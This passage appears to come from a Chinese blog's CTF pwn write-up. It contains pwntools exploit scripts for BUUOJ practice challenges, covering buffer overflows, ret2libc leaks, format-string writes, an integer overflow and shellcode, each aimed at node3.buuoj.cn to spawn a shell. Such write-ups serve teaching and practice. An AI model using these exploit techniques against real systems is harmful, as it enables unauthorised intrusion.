class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28640</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn22\"</span>)</span><br><span class=\"line\">ru(<span class=\"string\">\"Yippie, lets crash: \"</span>)</span><br><span class=\"line\">stack = int(ru(<span class=\"string\">'\\n'</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"comment\">#print(stack)</span></span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"./libc-2.27.so\")</span></span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\">payload = <span class=\"string\">\"crashme\\x00\"</span>  + <span class=\"string\">b'A'</span>*(<span class=\"number\">0x16</span><span class=\"number\">-8</span>+<span class=\"number\">4</span>) + p32(stack<span class=\"number\">-0x1c</span>) + shellcode</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-level3\"><a href=\"#jarvisoj-level3\" class=\"headerlink\" title=\"jarvisoj_level3\"></a>jarvisoj_level3</h2><p>简单write泄露</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.3\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.3\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"./libc-2.231.so\"</span>)</span><br><span class=\"line\">main = elf.sym[<span class=\"string\">\"main\"</span>]</span><br><span class=\"line\">write_plt = elf.sym[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x88</span>+<span class=\"number\">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class=\"number\">1</span>) + p32(write_got) + p32(<span class=\"number\">0x4</span>)</span><br><span class=\"line\">ru(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">write = uu32(r(<span class=\"number\">4</span>))</span><br><span class=\"line\">libc_base = write - libc.sym[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">leak(<span class=\"string\">\"libc\"</span>,libc_base)</span><br><span class=\"line\">sys = libc_base + libc.sym[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">sh = libc_base + next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x88</span>+<span class=\"number\">0x4</span>) + p32(sys) + p32(<span class=\"number\">0</span>) + p32(sh)</span><br><span class=\"line\">ru(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-fm\"><a href=\"#jarvisoj-fm\" class=\"headerlink\" title=\"jarvisoj_fm\"></a>jarvisoj_fm</h2><p>fmt</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.4\"</span>)</span><br><span class=\"line\">context.arch = elf.arch</span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">25708</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.4\")</span></span><br><span class=\"line\">x = <span class=\"number\">0x0804A02C</span></span><br><span class=\"line\">pld = fmtstr_payload(<span class=\"number\">11</span>,&#123;x:<span class=\"number\">4</span>&#125;)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-tell-me-something\"><a href=\"#jarvisoj-tell-me-something\" class=\"headerlink\" title=\"jarvisoj_tell_me_something\"></a>jarvisoj_tell_me_something</h2><p>简单调一下 发现ida里面偏移是错误的</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">25781</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.3\")</span></span><br><span class=\"line\">back = <span class=\"number\">0x0400620</span></span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x88</span>)+p64(back)</span><br><span class=\"line\">ru(<span class=\"string\">\"Input your message:\\n\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-level4\"><a href=\"#jarvisoj-level4\" class=\"headerlink\" title=\"jarvisoj_level4\"></a>jarvisoj_level4</h2><p>普通32位write泄露</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28988</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.3\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.6\"</span>)</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">write_plt = elf.sym[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">main = elf.sym[<span class=\"string\">\"main\"</span>]</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x88</span>+<span class=\"number\">0x4</span>)+p32(write_plt)+p32(main)+p32(<span class=\"number\">1</span>)+p32(write_got)+p32(<span class=\"number\">4</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">write = uu32(r(<span class=\"number\">4</span>))</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"./libc-2.231.so\"</span>)</span><br><span class=\"line\">libc_base = write-libc.sym[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">sys = libc_base+libc.sym[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">sh = libc_base+next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\">leak(<span class=\"string\">\"libc\"</span>,libc_base)</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x88</span>+<span class=\"number\">0x4</span>)+p32(sys)+p32(<span class=\"number\">0</span>)+p32(sh)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"bjdctf-2020-babystack2\"><a href=\"#bjdctf-2020-babystack2\" class=\"headerlink\" title=\"bjdctf_2020_babystack2\"></a>bjdctf_2020_babystack2</h2><p>整数溢出</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29933</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.3\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.6\"</span>)</span><br><span class=\"line\">back = <span class=\"number\">0x400726</span></span><br><span class=\"line\">ru(<span class=\"string\">\"[+]Please input the length of your name:\\n\"</span>)</span><br><span class=\"line\">sl(<span class=\"string\">\"2415919104\"</span>)</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x10</span>+<span class=\"number\">0x08</span>)+p64(back)</span><br><span class=\"line\">print(r())</span><br><span class=\"line\"><span class=\"comment\">#sleep(1)</span></span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-level3-x64\"><a href=\"#jarvisoj-level3-x64\" class=\"headerlink\" title=\"jarvisoj_level3_x64\"></a>jarvisoj_level3_x64</h2><p>64位write泄露</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">26477</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.8\",env =&#123;\"LD_PRELOAD\":\"./libc-2.232.so\"&#125;)</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x00000000004006b3</span></span><br><span class=\"line\">pop_rsi_pop_r15 = <span class=\"number\">0x00000000004006b1</span></span><br><span class=\"line\">ret = <span class=\"number\">0x0000000000400499</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.8\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"./libc-2.232.so\")</span></span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">write_plt = elf.plt[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">main = elf.sym[<span class=\"string\">'main'</span>]</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x80</span>+<span class=\"number\">0x8</span>)+p64(pop_rdi)+p64(<span class=\"number\">1</span>)+p64(pop_rsi_pop_r15)+p64(write_got)+p64(<span class=\"number\">0</span>)+p64(write_plt)+p64(main)</span><br><span class=\"line\">ru(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">write = uu64(r(<span class=\"number\">6</span>))</span><br><span class=\"line\"><span class=\"comment\"># libc_base = write - libc.sym[\"write\"]</span></span><br><span class=\"line\"><span class=\"comment\"># leak(\"libc\",libc_base)</span></span><br><span class=\"line\"><span class=\"comment\"># sys = libc_base + libc.sym[\"system\"]</span></span><br><span class=\"line\"><span class=\"comment\"># sh = libc_base + next(libc.search(\"/bin/sh\"))</span></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">'write'</span>,write)</span><br><span class=\"line\">libc_base = write - libc.dump(<span class=\"string\">'write'</span>)</span><br><span class=\"line\">leak(<span class=\"string\">\"libc\"</span>,libc_base)</span><br><span class=\"line\">sys = libc_base + libc.dump(<span class=\"string\">'system'</span>)</span><br><span class=\"line\">sh = libc_base + libc.dump(<span class=\"string\">'str_bin_sh'</span>)</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x80</span>+<span class=\"number\">0x8</span>)+p64(pop_rdi)+p64(sh)+p64(sys)</span><br><span class=\"line\">ru(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"picoctf-2018-rop-chain\"><a href=\"#picoctf-2018-rop-chain\" class=\"headerlink\" title=\"picoctf_2018_rop chain\"></a>picoctf_2018_rop chain</h2><p>字节存储问题</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span 